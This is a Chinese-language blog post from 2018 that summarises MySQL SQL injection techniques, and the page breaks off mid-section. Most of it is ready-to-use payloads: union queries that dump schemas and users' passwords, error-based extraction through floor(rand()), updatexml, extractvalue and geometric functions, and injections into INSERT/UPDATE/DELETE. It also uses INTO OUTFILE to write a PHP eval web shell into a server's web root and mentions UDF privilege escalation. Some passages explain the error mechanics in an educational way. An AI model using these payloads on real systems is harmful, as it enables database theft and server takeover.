<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="injection," />










<meta name="description" content="一个详细的总结 0x01 注入导图 0x02 基于有正确回显的注入 1.判断注入点2.测试是否存在过滤及绕过3.猜字段数(1).order by(2).select intoSELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。 SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。SQL SELECT INTO 语法您可以把所有的列插入新表： 123SEL">
<meta name="keywords" content="injection">
<meta property="og:type" content="article">
<meta property="og:title" content="Summary of SQL injection">
<meta property="og:url" content="http://yoursite.com/2018/05/26/Summary of SQL injection/index.html">
<meta property="og:site_name" content="Ratten3anger">
<meta property="og:description" content="一个详细的总结 0x01 注入导图 0x02 基于有正确回显的注入 1.判断注入点2.测试是否存在过滤及绕过3.猜字段数(1).order by(2).select intoSELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。 SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。SQL SELECT INTO 语法您可以把所有的列插入新表： 123SEL">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/1.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/1.png">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/7.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/8.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/9.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/10.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/11.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/12.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/13.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/2.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/3.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/4.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/5.jpg">
<meta property="og:image" content="http://yoursite.com/SQL%20injection/6.jpg">
<meta property="og:updated_time" content="2018-06-18T16:19:09.187Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Summary of SQL injection">
<meta name="twitter:description" content="一个详细的总结 0x01 注入导图 0x02 基于有正确回显的注入 1.判断注入点2.测试是否存在过滤及绕过3.猜字段数(1).order by(2).select intoSELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。 SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。SQL SELECT INTO 语法您可以把所有的列插入新表： 123SEL">
<meta name="twitter:image" content="http://yoursite.com/SQL%20injection/1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/05/26/Summary of SQL injection/"/>





  <title>Summary of SQL injection | Ratten3anger</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ratten3anger</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Security is a plain learning.安全こそ素朴な学問である。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/26/Summary of SQL injection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ratten3anger">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ratten3anger">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Summary of SQL injection</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-26T21:56:46+08:00">
                2018-05-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="一个详细的总结"><a href="#一个详细的总结" class="headerlink" title="一个详细的总结"></a>一个详细的总结</h3><hr>
<h3 id="0x01-注入导图"><a href="#0x01-注入导图" class="headerlink" title="0x01 注入导图"></a>0x01 注入导图</h3><p><img src="/SQL injection/1.jpg" alt="injection"></p>
<h3 id="0x02-基于有正确回显的注入"><a href="#0x02-基于有正确回显的注入" class="headerlink" title="0x02 基于有正确回显的注入"></a>0x02 基于有正确回显的注入</h3><hr>
<h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h4><h4 id="2-测试是否存在过滤及绕过"><a href="#2-测试是否存在过滤及绕过" class="headerlink" title="2.测试是否存在过滤及绕过"></a>2.测试是否存在过滤及绕过</h4><h4 id="3-猜字段数"><a href="#3-猜字段数" class="headerlink" title="3.猜字段数"></a>3.猜字段数</h4><h5 id="1-order-by"><a href="#1-order-by" class="headerlink" title="(1).order by"></a>(1).order by</h5><h5 id="2-select-into"><a href="#2-select-into" class="headerlink" title="(2).select into"></a>(2).select into</h5><p>SELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。</p>
<p>SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。<br>SQL SELECT INTO 语法<br>您可以把所有的列插入新表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">INTO new_table_name [IN externaldatabase] </span><br><span class="line">FROM old_tablename</span><br></pre></td></tr></table></figure>
<p>或者只把希望的列插入新表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">INTO new_table_name [IN externaldatabase] </span><br><span class="line">FROM old_tablename</span><br></pre></td></tr></table></figure>
<p><img src="/SQL injection/1.png" alt="injection"></p>
<h4 id="4-联合查询"><a href="#4-联合查询" class="headerlink" title="4.联合查询:"></a>4.联合查询:</h4><p><del>假设有三个字段</del></p>
<p><li>爆库</li></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,database()--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
<p><li>爆表名</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos; --+</span><br></pre></td></tr></table></figure>
<p>或者使用database()函数</p>
<p><li>爆列名</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos; --+</span><br></pre></td></tr></table></figure>
<p><li>爆数据：</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,username,password from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
<p>Tips:</p>
<blockquote>
<p>有时候可能当前页面数据库和敏感信息数据库不是同一个库，所以有时候会这样写,以申明查询目标所在库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1’ union select 1,username,password from security.users limit 0,1 -–+</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1’ union select 1,username,password from `users` limit 0,1 –-+</span><br></pre></td></tr></table></figure></p>
<h3 id="0x03-基于报错的注入"><a href="#0x03-基于报错的注入" class="headerlink" title="0x03 基于报错的注入"></a>0x03 基于报错的注入</h3><hr>
<h4 id="1-几个函数"><a href="#1-几个函数" class="headerlink" title="1.几个函数"></a>1.几个函数</h4><p>①Group by: 分组，合并相同的，并且按字母顺序排列。</p>
<p>②rand() // 随机函数（0，1）</p>
<p>③floor() //取整函数 比如floor(1.2)=1 </p>
<p>④count() //汇总函数</p>
<h4 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h4><p>利用select count(),concat(floor(rand(0)2)) as key from …… group by key报错<br>即rand函数产生的随机数取整之后被 group by 子句被分为key值等于1 和0 两类，然后count()统计该类型下的个数</p>
<p>为什么会报错:</p>
<blockquote>
<p>双注入的原理，简单一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句（group by）就会把查询的一部分以错误的形式显示出来“通过floor报错的方法来爆数据的本质是group by语句的报错。<br>Group by 在分组的时候先会对前面的concat(floor(rand()*2))进行检测，无疑只有0和1 两种结果 进行分类，然后就会插入这条数据 插入的过程中又会再进行一次计算 如果<strong>检测所计算出来的数和插入时所计算出来的数不一样</strong>，这个时候就会报错。(主键重复)</p>
</blockquote>
<h4 id="3-栗子"><a href="#3-栗子" class="headerlink" title="3.栗子"></a>3.栗子</h4><p><li>爆库：</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1),floor(rand()*2),0x3a,0x3a)name from information_schema.tables gruop by name) b) --+</span><br></pre></td></tr></table></figure>
<p><li>爆表名</li></p>
<p><li>爆列名</li></p>
<p><li>爆数据：</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; and  (select 1  from (select count(*),concat(0x3a,(select password from users limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from  information_schema.tables group by name) b) --+</span><br></pre></td></tr></table></figure>
<p>可简化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) --+</span><br></pre></td></tr></table></figure></p>
<p>如果关键的表被禁用了，可以使用这种形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>
<p>测试显示ERROR 1248 (42000): Every derived table must have its own alias<br>如果rand被禁用了可以使用系统变量来报错,赋名为”:”的系统变量值为1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</span><br></pre></td></tr></table></figure></p>
<p>测试可行</p>
<h4 id="4-另外九种报错方式"><a href="#4-另外九种报错方式" class="headerlink" title="4.另外九种报错方式"></a>4.另外九种报错方式</h4><h5 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1.extractvalue()"></a>1.extractvalue()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
<h5 id="2-updataxml"><a href="#2-updataxml" class="headerlink" title="2.updataxml()"></a>2.updataxml()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select uesr()),0x73),1));</span><br></pre></td></tr></table></figure>
<h5 id="3-geometrycollection"><a href="#3-geometrycollection" class="headerlink" title="3.geometrycollection()"></a>3.geometrycollection()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));		//与floor报错一样</span><br></pre></td></tr></table></figure>
<h4 id="4-multipoint"><a href="#4-multipoint" class="headerlink" title="4.multipoint()"></a>4.multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h5 id="5-polygon-polygon-六边形-，几何图形的函数"><a href="#5-polygon-polygon-六边形-，几何图形的函数" class="headerlink" title="5.polygon()        //polygon(六边形)，几何图形的函数"></a>5.polygon()        //polygon(六边形)，几何图形的函数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h5 id="6-multipolygon-两个六边形进行几何运算"><a href="#6-multipolygon-两个六边形进行几何运算" class="headerlink" title="6.multipolygon()        //两个六边形进行几何运算"></a>6.multipolygon()        //两个六边形进行几何运算</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h5 id="7-linestring"><a href="#7-linestring" class="headerlink" title="7.linestring()"></a>7.linestring()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h5 id="8-multilinestring"><a href="#8-multilinestring" class="headerlink" title="8.multilinestring()"></a>8.multilinestring()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h5 id="9-exp"><a href="#9-exp" class="headerlink" title="9.exp()"></a>9.exp()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
<h3 id="0x04-使用insert、update、delect进行注入"><a href="#0x04-使用insert、update、delect进行注入" class="headerlink" title="0x04 使用insert、update、delect进行注入"></a>0x04 使用insert、update、delect进行注入</h3><hr>
<h4 id="1-以updatexml-为例"><a href="#1-以updatexml-为例" class="headerlink" title="1.以updatexml()为例"></a>1.以updatexml()为例</h4><p>updatexml(XML_document,XPath_string,new_value);<br>XML_document是String格式，为XML文档对象的名称，文中为Doc<br>XPath_string (Xpath格式的字符串),如果不了解Xpath语法，可以在网上查找教程。<br>new_value String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,(version())),0) or</span><br></pre></td></tr></table></figure>
<p>Insert：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id, username, password) VALUES (2,&apos;Olivia&apos; or updatexml(1,concat(0x7e,(version())),0) or&apos;&apos;, &apos;Nervo&apos;);</span><br></pre></td></tr></table></figure>
<p>Update：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET password=&apos;Nicky&apos; or updatexml(2,concat(0x7e,(version())),0) or&apos;&apos;WHERE id=2 and username=&apos;Olivia&apos;;</span><br></pre></td></tr></table></figure>
<p>Delete：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or&apos;&apos;;</span><br></pre></td></tr></table></figure>
<p>以上均未复现成功<br>关于爆库、表、列等均是一样，不做赘述</p>
<h4 id="2-利用name-const-获取数据"><a href="#2-利用name-const-获取数据" class="headerlink" title="2.利用name_const()获取数据"></a>2.利用name_const()获取数据</h4><p>name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。<br>Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br></pre></td></tr></table></figure>
<p>在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。故不再赘述</p>
<p>一次获取多个信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @ from (select(@:=0x00),(select @ from test.a where (id&gt;@) and @ i</span><br><span class="line">n (@:=concat(0x2a,@,id,num))))a</span><br></pre></td></tr></table></figure></p>
<p>关于变量使用：mysql中@指系统变量<br>设定时这样写:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set @t1=1,@t2=2,......</span><br><span class="line">   select @t1,@t2,......</span><br></pre></td></tr></table></figure></p>
<h4 id="3-更多闭合变种："><a href="#3-更多闭合变种：" class="headerlink" title="3.更多闭合变种："></a>3.更多闭合变种：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (payload) or &apos;</span><br><span class="line">&apos; and (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;=&apos;</span><br><span class="line">&apos;* (payload) *&apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&quot; – (payload) – &quot;</span><br></pre></td></tr></table></figure>
<h4 id="4-几何函数"><a href="#4-几何函数" class="headerlink" title="4.几何函数"></a>4.几何函数</h4><p>geometrycollection()<br>multipoint()<br>原理：利用mysql_error(),构造报错语句，通过报错时返回的数据，来获取数据</p>
<h5 id="1-procedure-analyse"><a href="#1-procedure-analyse" class="headerlink" title="1.procedure analyse()"></a>1.procedure analyse()</h5><p>[LIMIT {[offset,] row_count | row_count OFFSET offset}]<br>[PROCEDURE procedure_name(argument_list)]</p>
<h5 id="2-using-name-const"><a href="#2-using-name-const" class="headerlink" title="2.using name_const():"></a>2.using name_const():</h5><p>补： select语句使用函数报错的位置: select , where , group by , order by 。//列名重复</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select(name_const(version(),1)),name_const(version(),1))a;</span><br></pre></td></tr></table></figure>
<h5 id="boolean型报错注入"><a href="#boolean型报错注入" class="headerlink" title="boolean型报错注入"></a>boolean型报错注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (if(version()&gt;5,2,1))*1e308</span><br></pre></td></tr></table></figure>
<h5 id="转移报错"><a href="#转移报错" class="headerlink" title="转移报错"></a>转移报错</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select convert(concat(&apos;a&apos;,id),signed)	//复现发现回显情况与预期不符</span><br></pre></td></tr></table></figure>
<p>(类型的转换)<br>整形溢出报错</p>
<h4 id="报错原理之深入研究"><a href="#报错原理之深入研究" class="headerlink" title="报错原理之深入研究"></a>报错原理之深入研究</h4><hr>
<p>floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错。</p>
<p><code>floor(rand()*2)</code>不加随机因子的时候是随机出错的，而在3条记录以上用<code>floor(rand(0)*2)</code>就一定报错，由此可猜想<code>floor(rand()*2)</code>是比较随机的，不具备确定性因素，而<code>floor(rand(0)*2)</code>具备某方面的确定性。</p>
<p>为了证明我们猜想，分别对<code>floor(rand()*2)</code>和<code>floor(rand(0)*2)</code>在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：</p>
<p><img src="/SQL injection/7.jpg" alt="injection"></p>
<p>毫无规则，那么<code>floor(rand(0)*2)</code>的结果又是如何呢：</p>
<p><img src="/SQL injection/8.jpg" alt="injection"></p>
<p>可以看到<code>floor(rand(0)*2)</code>是有规律的，而且是固定的，这个就是上面提到的由于是确定性才导致的报错，那为何会报错呢 :</p>
<p>首先来了解一下MySQL在处理<code>select count(*) from TSafe group by x</code>的流程：</p>
<p>​    1.先建立虚拟表，如下图(其中key是主键，不可重复):</p>
<p><img src="/SQL injection/9.jpg" alt="injection"></p>
<p>​    2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新记录，存在则<code>count(*)</code>字段直接加1，如下图:</p>
<p><img src="/SQL injection/10.jpg" alt="injection"> </p>
<p>由此看到 如果key存在的话就+1， 不存在的话就新建一个key。 </p>
<p>其实mysql官方有给过提示，就是查询的时候如果使用<code>rand()</code>的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用<code>group by</code>的时候，<code>floor(rand(0)*2)</code>会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下<code>floor(rand(0)*2)</code>报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中<code>floor(rand(0)*2)</code>的值是定性的，为011011…(记住这个顺序很重要)，报错实际上就是<code>floor(rand(0)*2)</code>被计算多次导致的，具体看看<code>select count(*) from TSafe group by floor(rand(0)*2);</code>的查询过程：</p>
<p>1.查询前默认会建立空虚拟表如下图:</p>
<p><img src="/SQL injection/11.jpg" alt="injection"></p>
<p>2.取第一条记录，执行<code>floor(rand(0)*2)</code>，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则<code>floor(rand(0)*2)</code>会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图: </p>
<p><img src="/SQL injection/12.jpg" alt="injection"></p>
<p>3.查询第二条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以<code>floor(rand(0)*2)</code>不会被计算第二次，直接<code>count(*)</code>加1，第二条记录查询完毕，结果如下: </p>
<p><img src="/SQL injection/13.jpg" alt=""></p>
<p>4.查询第三条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时<code>floor(rand(0)*2)</code>被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p>
<p>5.整个查询过程<code>floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
<h3 id="0x05-基于文件读写权限的注入"><a href="#0x05-基于文件读写权限的注入" class="headerlink" title="0x05 基于文件读写权限的注入"></a>0x05 基于文件读写权限的注入</h3><hr>
<h4 id="1-条件"><a href="#1-条件" class="headerlink" title="1.条件"></a>1.条件</h4><p>需要my.ini(phpstudy中)里面的 secur_file_priv变量为空，不敢一般MySQL5.5.53之前的版本默认为空，之后的版本为null，所以说这种注入比较依赖MySQL的版本。<br>可以使用：select @@secure_file_priv来查询权限。<br>关于secur_file_priv变量：</p>
<blockquote>
<p>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。<br>如果变量为空，则不会产生影响，引起不安全的配置。<br>如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。<br>此外，该系统变量只允许读</p>
</blockquote>
<h4 id="2-一些函数"><a href="#2-一些函数" class="headerlink" title="2.一些函数"></a>2.一些函数</h4><p>(1)load_file: 读取文件<br>(2)into dumpfile/outfile: 将表的内容导出为一个文本文件</p>
<blockquote>
<p>Tips：<br>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p>
</blockquote>
<h4 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示:"></a>3.演示:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users into outfile ‘d:/1.txt’;</span><br><span class="line">select load_file(‘d:/1.txt’)</span><br></pre></td></tr></table></figure>
<p><img src="/SQL injection/2.jpg" alt="injection"><br>或者直接写入shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[&apos;syclover&apos;]);?&gt;&apos;into outfile &quot;filepath&quot;</span><br></pre></td></tr></table></figure></p>
<h4 id="4-实际"><a href="#4-实际" class="headerlink" title="4.实际:"></a>4.实际:</h4><p><li>用菜刀连接</li></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos;   --+</span><br></pre></td></tr></table></figure>
<p><li>改扩展名绕过操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,load_file(&apos;D:/phpStudy/www/1234.php&apos;) into outfile &apos;D:/phpStudy/www/123455.txt&apos;   --+</span><br></pre></td></tr></table></figure></li></p>
<h4 id="5-区别"><a href="#5-区别" class="headerlink" title="5.区别:"></a>5.区别:</h4><p>dumpfile只能导出一行数据<br>若我们想把一个可执行2进制文件用into outfile函数导出,<br>事实上,导出后就会被破坏</p>
<p>因为into outfile函数会在行末端写入新行更致命的是会转义换行符<br>这样的话这个2进制可执行文件就会被破坏</p>
<p>这时候我们用into dumpfile就能导出一个完整能执行的2进制文件<br>into dumpfile函数不对任何列或行进行终止也不执行任何转义处理</p>
<p>如在无web脚本执行，但是有mysql root执行的环境下我们就可以通过<br>into dump函数导入udf.dll进行提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variable like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure>
